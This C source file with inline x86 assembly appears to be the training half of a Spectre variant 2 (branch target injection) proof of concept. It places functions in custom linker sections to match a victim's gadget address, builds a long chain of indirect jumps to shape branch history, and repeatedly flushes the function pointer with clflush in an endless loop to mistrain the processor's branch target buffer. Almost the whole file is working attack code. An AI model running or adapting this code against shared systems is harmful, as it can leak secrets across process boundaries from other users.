#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>

//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));


uint8_t probe_buf[4096*256];
/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile ( "movb (%%rbx), %%al\n"                :: "b"((uint8_t*)&probe_buf[190*4096]) : "rax");

}

void __attribute__((section (".fnptr"))) (*fn_ptr)(void); // we'll set this = target_fn, and cflush it
uint64_t jmp_ptr;
uint64_t jmp_offset;

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile (
            "jmp call_get_rip\n"
        "get_rip:\n"
            "pop %%rax\n" // rax = rip
            "push %%rax\n"
            "ret\n"
        "call_get_rip:\n"
            "call get_rip\n"

            "add (%%rbx), %%rax\n"
            "add $9, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            //"nop\n"
            //"nop\n" // No idea why nops instead of an extra add/jmpq improves ~5%
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            :: "a"(0x03), "b"(&jmp_offset) : "rcx");
    //*/

    // Do indirect jump
    (*fn_ptr)();
}


void train()
{
    fn_ptr = target_fn;
    //jmp_ptr = 0x400a5d;
    jmp_ptr = 0x400a1b;
    jmp_offset =0;
    while (1) {
        //_mm_clflush(&probe_buf[110*4096]);
        _mm_clflush(fn_ptr);
        _mm_clflush(&jmp_offset);
        indirect();
        //usleep(1);
    }
}


void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);
    printf("&x = %p\n", &x);

    fn_ptr = target_fn;
    printf("&fn_ptr = %p\n", &fn_ptr);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("target_fn = %p\n", target_fn);

    printf("probe_buf: %p\n", probe_buf);
    printf("&probe_buf[190*4096]: %p\n", &probe_buf[190*4096]);
    printf("training...\n");

    train();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
